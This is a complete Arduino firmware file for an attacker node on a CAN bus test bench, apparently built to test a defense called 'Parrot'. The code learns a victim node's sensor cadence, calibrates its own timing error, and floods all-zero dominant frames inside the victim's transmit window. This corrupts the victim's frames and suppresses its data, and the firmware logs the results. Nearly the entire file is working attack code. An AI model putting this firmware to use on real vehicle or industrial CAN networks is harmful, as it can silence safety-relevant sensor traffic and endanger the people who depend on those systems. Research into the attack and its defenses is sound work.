// Node C: cadence-learning ambush that strikes exactly inside B's
// transmit window.
// Compiled only when selected in NodeConfig.h.
//
// Strategy: C watches B's legitimate SENSOR publications, learns the
// sending cadence from two consecutive frames and predicts the third
// arrival as t3 = t2 + (t2 - t1).  The ambush must land inside B's frame
// transmission itself, because that window is the only time B cannot act:
//
//   before the frame  -> B is listening; any C frame wakes Parrot early
//   during the frame  -> B is on the bus and BLIND; C's zeros win the data
//                        field bit-by-bit (zeros are dominant), B takes a
//                        bit error and retransmits straight into the flood
//   after the frame   -> A already consumed the legitimate sample
//
// B's DLC-8 frame at 500 kbit/s lasts roughly 220-270 us on the wire, so
// ALL timing here uses micros(), not millis(): a millisecond-resolution
// trigger is guaranteed to miss a quarter-millisecond window.  The slot is
// predicted in microseconds from RX-stamp times, and FIRE_LEAD_US removes
// the fixed pipeline lag between B's physical transmission and the moment
// C's loop reads and stamps the frame (controller buffering + SPI + poll
// latency).  Tune FIRE_LEAD_US downward (less lead) if strikes fire early
// and wake Parrot, upward if they fire late and the slot is lost.
//
// While the strike runs, C keeps listening and discriminates by payload:
//   * a legitimate B payload on the bus -> the slot was lost (C fired too
//     early or too late), the strike ends immediately;
//   * an all-zero B frame -> Parrot has engaged.  C stops pumping because
//     zero-on-zero frames coalesce on the wire, no error frames are
//     produced, and both controllers' TEC counters would be healed.
// Logs are structured `millis C KEY=VALUE ...` lines for machine parsing.
#include "NodeConfig.h"
#if ACTIVE_NODE == NODE_C
#include <Arduino.h>
#include <SPI.h>
#include <EEPROM.h>
#include <mcp2515_can.h>
#include "Protocol.h"

// Structured outcome of one strike, logged in ATTACK_RESULT.
// Declared before any function definition: the Arduino IDE inserts
// auto-generated prototypes near the top of the .ino translation unit,
// so a parameter type must exist by then or compilation fails.
enum StrikeOutcome : uint8_t {
  OUTCOME_AMBUSHED,        // slot covered, B never got a frame through
  OUTCOME_SLOT_LOST,       // B's legitimate frame arrived during the strike
  OUTCOME_DEFENSE_ENGAGED, // B's Parrot pulse appeared; C stood down
  OUTCOME_NO_FRAMES,       // nothing left C's transmitter at all
  OUTCOME_BUS_OFF          // C was pushed off the bus mid-strike
};

// Shield and serial configuration.
const uint8_t CAN_CS = 9;
const uint8_t CAN_CLOCK = MCP_16MHz;
const uint32_t CAN_SPEED = CAN_500KBPS;
const uint32_t SERIAL_SPEED = 115200;

const char ROLE = 'C';

// Attack timing.  FIRE_LEAD_US is subtracted from the predicted slot so the
// flood reaches the bus while B is actually mid-transmission: C's RX stamp
// for B's frame lags B's physical transmission by a roughly constant
// pipeline delay (MCP2515 buffering + SPI transfer + loop poll latency),
// so a raw prediction fires that same amount too late.  Start at 200 us and
// tune per bench results as described in the header comment.
const uint32_t FIRE_LEAD_US = 200;
// Shadow-calibration slots: B frames C observes WITHOUT attacking, purely to
// measure its own prediction error before the first strike is ever fired.
const uint8_t CAL_SLOTS = 3;
// Bounds a degenerate strike; normal exits are the classified outcomes.
const uint32_t AMBUSH_MAX_MS = 120;
// Plausibility bounds for a learned cadence, in MICROSECONDS; anything
// outside is treated as pulse debris or noise and re-learned.
const uint32_t PERIOD_MIN_US = 50000;
const uint32_t PERIOD_MAX_US = 2000000;
const uint32_t STATS_INTERVAL_MS = 2000;
const uint8_t TX_BUFFERS = 3;

// Driver instance for the shield connected through chip-select D9.
mcp2515_can can(CAN_CS);

// State machine for cadence learning and timed ambushes.
enum TrapState : uint8_t {
  TRAP_DISABLED,
  TRAP_LEARN,
  TRAP_ARMED
};

// Counters separate cadence learning from strike outcomes.
struct Counters {
  uint32_t rx, bad, unrelated, overflow;
  uint32_t sensorFrames, cadencesLearned, strikes;
  uint32_t ambushed, slotsLost, defenseEngaged, noFrames, busOffStrikes;
  uint32_t zerosQueued, zeroOk, zeroFail, zeroSkipped;
  uint32_t bLegitSeen, bPulseSeen;
} counts = {};

// Controller and attack state.
bool ready = false;
bool halted = false;
bool attackEnabled = false;
bool strikeActive = false;
TrapState trapState = TRAP_DISABLED;

// Session value persists across resets via EEPROM, mirroring the other nodes.
uint16_t bootSession = 0;

// Cadence observations and wrap-safe timestamps, all in MICROSECONDS.
uint32_t t1 = 0, t2 = 0, predicted = 0;
bool haveT1 = false, haveT2 = false;
uint32_t strikeStartedAt = 0;
uint32_t periodUs = 0;
// Shadow calibration: signed deviation (observed RX stamp minus predicted
// slot, wrap-safe) accumulated over CAL_SLOTS passive observations.  Its
// mean is the empirical pipeline correction that replaces the nominal
// FIRE_LEAD_US guess -- the code measures its own miss distance.
bool shadowActive = false;
uint8_t shadowCount = 0;
int32_t shadowSum = 0;
// Effective fire lead: starts at the nominal constant, replaced by the
// measured value once calibration completes.
uint32_t fireLeadUs = FIRE_LEAD_US;
uint8_t strikePeakTec = 0;
uint32_t strikeOkBase = 0;
uint32_t strikeFailBase = 0;
uint32_t strikeLegitBase = 0;
uint32_t strikePulseBase = 0;
uint32_t lastInit = 0;
uint32_t lastDiag = 0;
uint32_t lastStats = 0;

// Per-strike perception of the defender, resolved at ATTACK_RESULT time.
bool sawLegitFrame = false;
bool sawPulseFrame = false;

// Error high-water marks make accidental collisions visible in the logs.
uint8_t previousErrorState = 0xff;
uint8_t controllerPeakTec = 0;
uint8_t controllerPeakRec = 0;
uint8_t controllerEflgSeen = 0;

// The all-zero payload: same DLC as B's samples, dominant in every bit.
uint8_t zeroData[8] = {};

// Reads one MCP2515 register through the SPI READ command.
uint8_t regRead(uint8_t address) {
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  digitalWrite(CAN_CS, LOW);
  SPI.transfer(0x03);
  SPI.transfer(address);
  const uint8_t value = SPI.transfer(0);
  digitalWrite(CAN_CS, HIGH);
  SPI.endTransaction();
  return value;
}

// Updates selected MCP2515 register bits without changing the others.
void regModify(uint8_t address, uint8_t mask, uint8_t value) {
  SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
  digitalWrite(CAN_CS, LOW);
  SPI.transfer(0x05);
  SPI.transfer(address);
  SPI.transfer(mask);
  SPI.transfer(value);
  digitalWrite(CAN_CS, HIGH);
  SPI.endTransaction();
}

// Prints the `millis C ` prefix used by every structured log line.
void eventPrefix() {
  Serial.print(millis());
  Serial.print(F(" C "));
}

// Prints a timestamped event tagged with node C.
void event(const __FlashStringHelper *message) {
  eventPrefix();
  Serial.println(message);
}

// Returns a short name for the current trap state.
const __FlashStringHelper *stateName() {
  if (trapState == TRAP_LEARN) return F("LISTENING");
  if (trapState == TRAP_ARMED) return F("ARMED");
  return F("DISABLED");
}

// Prints the controller's error counters and flags.
void printRegisters() {
  Serial.print(F("EFLG=0x")); Serial.print(regRead(0x2d), HEX);
  Serial.print(F(" TEC=")); Serial.print(regRead(0x1c));
  Serial.print(F(" REC=")); Serial.print(regRead(0x1d));
  Serial.print(F(" TX0CTRL=0x")); Serial.println(regRead(0x30), HEX);
}

// Prints the evidence used to judge whether the ambush worked.
void printStats() {
  eventPrefix();
  Serial.print(F("STATS state=")); Serial.print(stateName());
  Serial.print(F(" enabled=")); Serial.print(attackEnabled ? 1 : 0);
  Serial.print(F(" strike=")); Serial.print(strikeActive ? 1 : 0);
  Serial.print(F(" rx=")); Serial.print(counts.rx);
  Serial.print(F(" bad=")); Serial.print(counts.bad);
  Serial.print(F(" unrelated=")); Serial.print(counts.unrelated);
  Serial.print(F(" overflow=")); Serial.print(counts.overflow);
  Serial.print(F(" sensor_frames=")); Serial.print(counts.sensorFrames);
  Serial.print(F(" cadences=")); Serial.print(counts.cadencesLearned);
  Serial.print(F(" period_us=")); Serial.print(periodUs);
  Serial.print(F(" strikes=")); Serial.print(counts.strikes);
  Serial.print(F(" ambushed=")); Serial.print(counts.ambushed);
  Serial.print(F(" slots_lost=")); Serial.print(counts.slotsLost);
  Serial.print(F(" defense_engaged=")); Serial.print(counts.defenseEngaged);
  Serial.print(F(" no_frames=")); Serial.print(counts.noFrames);
  Serial.print(F(" bus_off_strikes=")); Serial.print(counts.busOffStrikes);
  Serial.print(F(" zeros_queued=")); Serial.print(counts.zerosQueued);
  Serial.print(F(" zero_ok=")); Serial.print(counts.zeroOk);
  Serial.print(F(" zero_fail=")); Serial.print(counts.zeroFail);
  Serial.print(F(" zero_skip=")); Serial.print(counts.zeroSkipped);
  Serial.print(F(" b_legit_seen=")); Serial.print(counts.bLegitSeen);
  Serial.print(F(" b_pulse_seen=")); Serial.print(counts.bPulseSeen);
  Serial.print(F(" peak_TEC=")); Serial.print(controllerPeakTec);
  Serial.print(F(" peak_REC=")); Serial.print(controllerPeakRec);
  Serial.print(F(" EFLG_seen=0x")); Serial.println(controllerEflgSeen, HEX);
  if (ready) printRegisters();
}

// Preserves short error-counter changes that periodic logs could miss.
void sampleControllerHighWater() {
  const uint8_t tec = regRead(0x1c);
  const uint8_t rec = regRead(0x1d);
  const uint8_t eflg = regRead(0x2d);
  if (tec > controllerPeakTec) controllerPeakTec = tec;
  if (rec > controllerPeakRec) controllerPeakRec = rec;
  controllerEflgSeen |= eflg;
}

// Resets and configures the MCP2515 with default retransmission behavior.
bool initializeCan() {
  pinMode(10, OUTPUT); digitalWrite(10, HIGH);
  pinMode(4, OUTPUT); digitalWrite(4, HIGH);
  if (can.begin(CAN_SPEED, CAN_CLOCK) != CAN_OK) {
    event(F("CAN_INIT_FAIL"));
    return false;
  }
  if (can.setMode(MODE_NORMAL) != CAN_OK) return false;
  if (can.init_Mask(0, 0, 0) != CAN_OK ||
      can.init_Mask(1, 0, 0) != CAN_OK) return false;
  for (uint8_t i = 0; i < 6; ++i) {
    if (can.init_Filt(i, 0, 0) != CAN_OK) return false;
  }
  regModify(0x60, 0x64, 0x04);
  regModify(0x70, 0x60, 0);
  regModify(0x2c, 0x1c, 0);
  halted = false;
  previousErrorState = 0xff;
  event(F("CAN_READY 11bit 500k DLC8"));
  return true;
}

// Fills any idle TX buffer with one all-zero frame; returns true when at
// least one buffer accepted a frame.
bool pumpZeros() {
  bool queuedAny = false;
  for (uint8_t i = 0; i < TX_BUFFERS; ++i) {
    if (can.trySendMsgBuf(Lab::SENSOR_ID, 0, 0, Lab::DLC, zeroData, i) == CAN_OK) {
      ++counts.zerosQueued;
      queuedAny = true;
    } else {
      ++counts.zeroSkipped;
    }
  }
  return queuedAny;
}

// Harvests completed zero transmissions so the buffers keep cycling.
void harvestTxBuffers() {
  const uint8_t intf = regRead(0x2c);
  const uint8_t iflags[TX_BUFFERS] = {0x04, 0x08, 0x10};
  const uint8_t ctrls[TX_BUFFERS] = {0x30, 0x40, 0x50};
  for (uint8_t i = 0; i < TX_BUFFERS; ++i) {
    if (!(intf & iflags[i])) continue;
    const uint8_t ctrl = regRead(ctrls[i]);
    regModify(0x2c, iflags[i], 0);
    if (!(ctrl & 0x50)) ++counts.zeroOk;
    else ++counts.zeroFail;
  }
}

// Opens the ambush at the predicted slot and snapshots the counters the
// outcome report needs.
void beginStrike(uint32_t now) {
  strikeActive = true;
  strikeStartedAt = now;
  strikePeakTec = regRead(0x1c);
  strikeOkBase = counts.zeroOk;
  strikeFailBase = counts.zeroFail;
  strikeLegitBase = counts.bLegitSeen;
  strikePulseBase = counts.bPulseSeen;
  sawLegitFrame = false;
  sawPulseFrame = false;
  ++counts.strikes;
  eventPrefix();
  Serial.print(F("ATTACK_START type=ambush"));
  Serial.print(F(" predicted_slot_us=")); Serial.print(predicted);
  Serial.print(F(" fire_lead_us=")); Serial.print(fireLeadUs);
  Serial.print(F(" period_us=")); Serial.println(periodUs);
  pumpZeros();
}

// Classifies and logs how the just-finished strike went, then returns to
// cadence learning because the defense has shifted B's rhythm.
// NOTE: the parameter is uint8_t rather than StrikeOutcome.  The Arduino
// IDE hoists auto-generated prototypes above every user declaration --
// including enums -- and any custom type in a function signature breaks
// the generated prototype ("declared void" errors).  Plain integral
// parameters keep the prototype pass valid; the named enum constants
// passed at call sites convert implicitly.
void endStrike(uint8_t outcome) {
  const uint32_t delivered = counts.zeroOk - strikeOkBase;
  const uint32_t contested = counts.zeroFail - strikeFailBase;
  const uint32_t legit = counts.bLegitSeen - strikeLegitBase;
  const uint32_t pulse = counts.bPulseSeen - strikePulseBase;
  strikeActive = false;
  switch (outcome) {
    case OUTCOME_AMBUSHED:        ++counts.ambushed; break;
    case OUTCOME_SLOT_LOST:       ++counts.slotsLost; break;
    case OUTCOME_DEFENSE_ENGAGED: ++counts.defenseEngaged; break;
    case OUTCOME_NO_FRAMES:       ++counts.noFrames; break;
    case OUTCOME_BUS_OFF:         ++counts.busOffStrikes; break;
  }
  eventPrefix();
  Serial.print(F("ATTACK_RESULT outcome="));
  switch (outcome) {
    case OUTCOME_AMBUSHED:        Serial.print(F("AMBUSHED slot_covered_b_blind")); break;
    case OUTCOME_SLOT_LOST:       Serial.print(F("SLOT_LOST b_frame_got_through")); break;
    case OUTCOME_DEFENSE_ENGAGED: Serial.print(F("DEFENSE_ENGAGED parrot_active_ceasefire")); break;
    case OUTCOME_NO_FRAMES:       Serial.print(F("FAILED reason=no_frames_on_bus")); break;
    case OUTCOME_BUS_OFF:         Serial.print(F("FAILED reason=attacker_bus_off")); break;
  }
  Serial.print(F(" zeros_ok=")); Serial.print(delivered);
  Serial.print(F(" zeros_failed=")); Serial.print(contested);
  Serial.print(F(" b_legit_seen=")); Serial.print(legit);
  Serial.print(F(" b_pulse_seen=")); Serial.print(pulse);
  Serial.print(F(" peak_TEC=")); Serial.print(strikePeakTec);
  Serial.print(F(" duration_ms=")); Serial.println(millis() - strikeStartedAt);
  // B's cadence moved during the exchange; re-learn from scratch.  The
  // calibrated fire lead survives: the pipeline lag is a property of C's
  // hardware, not of B's cadence.
  haveT1 = false;
  haveT2 = false;
  shadowActive = false;
  trapState = TRAP_LEARN;
  event(F("LISTENING re-learning B's cadence"));
}

// Drains RX during the strike and classifies B's frames by payload:
// nonzero payload -> legitimate sensor frame; all-zero payload -> B's
// Parrot pulse.  Everything else is counted as noise.
void classifyTraffic(uint32_t now) {
  for (uint8_t n = 0; n < 8 && can.checkReceive() == CAN_MSGAVAIL; ++n) {
    uint8_t len = 0;
    uint8_t data[8] = {};
    if (can.readMsgBuf(&len, data) != CAN_OK) {
      ++counts.bad;
      continue;
    }
    const uint32_t id = can.getCanId();
    ++counts.rx;
    if (can.isExtendedFrame() || can.isRemoteRequest()) {
      ++counts.bad;
      continue;
    }
    if (id != Lab::SENSOR_ID || len != Lab::DLC) {
      ++counts.unrelated;
      continue;
    }
    if (Lab::allZero(data)) {
      // Normal mode never echoes C's own frames, so a zero frame on the
      // bus means B's Parrot pulse is live.  Stand down immediately:
      // zero-on-zero merging would heal both controllers' TEC counters.
      ++counts.bPulseSeen;
      sawPulseFrame = true;
      return;
    }
    if (Lab::validSensor(data)) {
      // B's real sample reached the bus: the ambush fired too early or
      // too late and the slot is lost.  Further flooding serves nothing.
      ++counts.bLegitSeen;
      sawLegitFrame = true;
      return;
    }
    ++counts.bad;
  }
}

// Records B's legitimate publications and builds the rolling (t1, t2)
// pair.  Called only while listening, never during a strike, so B's
// transmissions triggered by the attack cannot poison the cadence model.
void observeSensor(uint32_t nowUs) {
  ++counts.sensorFrames;
  if (strikeActive) return;
  if (!haveT1) {
    t1 = nowUs;
    haveT1 = true;
    return;
  }
  // Reject implausible intervals: they come from Parrot debris or noise,
  // not from B's sampling rhythm.
  const uint32_t gap = uint32_t(nowUs - t1);
  if (gap < PERIOD_MIN_US || gap > PERIOD_MAX_US) {
    t1 = nowUs;
    return;
  }
  if (!haveT2) {
    t2 = nowUs;
    haveT2 = true;
    periodUs = uint32_t(t2 - t1);
    predicted = t2 + periodUs;
    ++counts.cadencesLearned;
    // Do not arm yet: first shadow-calibrate the prediction over CAL_SLOTS
    // passive slots, measuring how far B's actual arrivals deviate.
    shadowActive = true;
    shadowCount = 0;
    shadowSum = 0;
    eventPrefix();
    Serial.print(F("CADENCE_LEARNED period_us="));
    Serial.print(periodUs);
    Serial.print(F(" predicted_slot_us="));
    Serial.print(predicted);
    Serial.println(F(" shadow_cal=START"));
    return;
  }
  if (shadowActive) {
    // Wrap-safe signed deviation against the prediction that was current
    // BEFORE this frame arrived.
    const int32_t dev = int32_t(nowUs - predicted);
    const int32_t tol = int32_t(periodUs / 4);
    if (dev < -tol || dev > tol) {
      // Wild outlier: debris or a missed frame.  Restart the sample.
      shadowCount = 0;
      shadowSum = 0;
    } else {
      shadowSum += dev;
      ++shadowCount;
    }
    if (shadowCount >= CAL_SLOTS) {
      // Empirical correction: positive mean deviation means C's RX stamps
      // lag B's physical transmission, so the fire point must move that
      // much earlier than the raw prediction.
      fireLeadUs = FIRE_LEAD_US +
                   uint32_t(shadowSum / int32_t(CAL_SLOTS));
      shadowActive = false;
      trapState = TRAP_ARMED;
      eventPrefix();
      Serial.print(F("SHADOW_CALIBRATED samples="));
      Serial.print(CAL_SLOTS);
      Serial.print(F(" mean_dev_us="));
      Serial.print(shadowSum / int32_t(CAL_SLOTS));
      Serial.print(F(" fire_lead_us="));
      Serial.println(fireLeadUs);
      event(F("ARMED strike on the next predicted slot"));
    }
  }
  t1 = t2;
  t2 = nowUs;
  periodUs = uint32_t(t2 - t1);
  predicted = t2 + periodUs;
}

// Drains RX quickly while LISTENING and classifies SENSOR traffic.
void receiveFrames(uint32_t now) {
  for (uint8_t n = 0; n < 24 && can.checkReceive() == CAN_MSGAVAIL; ++n) {
    uint8_t len = 0;
    uint8_t data[8] = {};
    if (can.readMsgBuf(&len, data) != CAN_OK) {
      ++counts.bad;
      continue;
    }
    // Stamp as close to the wire event as the API allows: micros(), taken
    // immediately after the frame is read out of the controller.
    const uint32_t stampUs = micros();
    const uint32_t id = can.getCanId();
    ++counts.rx;
    if (can.isExtendedFrame() || can.isRemoteRequest()) {
      ++counts.bad;
      continue;
    }
    if (id != Lab::SENSOR_ID) {
      ++counts.unrelated;
      continue;
    }
    if (len != Lab::DLC) {
      ++counts.bad;
      continue;
    }
    if (Lab::allZero(data)) {
      // B's Parrot pulse traffic: irrelevant to the cadence model.
      ++counts.bPulseSeen;
      continue;
    }
    if (Lab::validSensor(data)) observeSensor(stampUs);
  }
}

// Advances cadence learning and opens ambushes exactly at the predicted
// transmit window of B.
void serviceTrap(uint32_t now) {
  if (trapState == TRAP_DISABLED || !attackEnabled) return;

  if (strikeActive) {
    // Keep the flood dense and the perception live for the whole window.
    pumpZeros();
    harvestTxBuffers();
    classifyTraffic(now);
    const uint8_t tec = regRead(0x1c);
    if (tec > strikePeakTec) strikePeakTec = tec;

    // Priority 1: B pushed us off the bus -- strike is over either way.
    if (halted) {
      endStrike(OUTCOME_BUS_OFF);
      return;
    }
    // Priority 2: B's Parrot pulse appeared.  Zero-on-zero frames merge on
    // the wire and heal both TEC counters, so the attacker stands down to
    // protect its own error budget; that is the ceasefire outcome.
    if (sawPulseFrame) {
      endStrike(OUTCOME_DEFENSE_ENGAGED);
      return;
    }
    // Priority 3: B's legitimate frame slipped through.  Slot lost.
    if (sawLegitFrame) {
      endStrike(OUTCOME_SLOT_LOST);
      return;
    }
    // Priority 4: window exhausted with nothing observed at all.
    if (Lab::elapsed(now, strikeStartedAt, AMBUSH_MAX_MS)) {
      endStrike(counts.zeroOk > strikeOkBase ? OUTCOME_AMBUSHED
                                             : OUTCOME_NO_FRAMES);
    }
    return;
  }

  if (trapState == TRAP_LEARN || !haveT2) return;

  // Fire on the MICROSECOND timeline.  The trigger point is
  // (predicted - fireLeadUs), where fireLeadUs is the empirically
  // calibrated pipeline correction measured by the shadow pass: C's RX
  // stamp trails B's physical transmission by the readout pipeline, while
  // firing genuinely EARLY would reach B while it is still listening and
  // wake Parrot before the ambush window arrives.
  if (trapState == TRAP_ARMED) {
    const uint32_t nowUs = micros();
    if (int32_t(nowUs - (predicted - fireLeadUs)) >= 0) {
      beginStrike(now);
    }
  }
}

// Reports CAN error-state changes and clears receive-overflow flags.
void diagnostics(uint32_t now) {
  if (!Lab::elapsed(now, lastDiag, 2)) return;
  lastDiag = now;
  const uint8_t flags = regRead(0x2d);
  const uint8_t state = flags & 0x3f;
  if (state != previousErrorState) {
    previousErrorState = state;
    event(F("CAN_STATE_CHANGED"));
    printRegisters();
  }
  if (flags & 0xc0) {
    ++counts.overflow;
    regModify(0x2d, 0xc0, 0);
  }
  if ((flags & 0x20) && !halted) {
    halted = true;
    attackEnabled = false;
    trapState = TRAP_DISABLED;
    if (strikeActive) endStrike(OUTCOME_BUS_OFF);
    event(F("C_BUS_OFF attack disabled - press r to reinit"));
  }
}

// Prints the serial commands supported by this attack firmware.
void help() {
  event(F("h help | s stats | r reinit CAN"));
  event(F("C: a toggle cadence ambush | 1 immediate strike"));
}

// Reads and executes at most one serial command per loop iteration.
void commands() {
  if (!Serial.available()) return;
  const char command = Serial.read();
  if (command == 'h') help();
  if (command == 's') printStats();
  if (command == 'r') {
    attackEnabled = false;
    strikeActive = false;
    trapState = TRAP_DISABLED;
    ready = initializeCan();
    lastInit = millis();
    event(F("CAN_REINIT"));
  }
  if (command == 'a') {
    attackEnabled = !attackEnabled;
    if (attackEnabled) {
      trapState = TRAP_LEARN;
      haveT1 = false;
      haveT2 = false;
      event(F("TRAP_ON LISTENING for B's cadence"));
    } else {
      strikeActive = false;
      trapState = TRAP_DISABLED;
      event(F("CADENCE_TRAP_OFF"));
    }
  }
  if (command == '1' && !strikeActive) {
    // Manual one-shot: strike now regardless of the learned cadence.
    predicted = micros();
    periodUs = 0;
    beginStrike(millis());
  }
}

// Initializes Serial, the attack session, and the CAN controller.
void setup() {
  Serial.begin(SERIAL_SPEED);
  EEPROM.get(0, bootSession);
  bootSession = (bootSession == 0xffffU || bootSession == 0xfffeU) ?
    1 : uint16_t(bootSession + 1);
  if (!bootSession) bootSession = 1;
  EEPROM.put(0, bootSession);
  event(F("NODE_INIT AMBUSH_CADENCE"));
  ready = initializeCan();
  lastInit = millis();
  help();
}

// Cooperatively learns cadence and ambushes B's transmit window.  During a
// strike every loop iteration does I/O only: no Serial, no heavy work, so
// the flood stays dense enough to cover B's frame and its retries.
void loop() {
  uint32_t now = millis();
  commands();
  if (!ready) {
    if (Lab::elapsed(now, lastInit, 2000)) {
      lastInit = now;
      ready = initializeCan();
    }
    return;
  }

  sampleControllerHighWater();
  diagnostics(now);
  if (strikeActive) {
    serviceTrap(now);
    return;  // no Serial work inside a strike: keep the flood dense
  }
  receiveFrames(millis());
  serviceTrap(millis());

  if (Lab::elapsed(millis(), lastStats, STATS_INTERVAL_MS)) {
    lastStats = millis();
    printStats();
  }
}
#endif  // ACTIVE_NODE == NODE_C
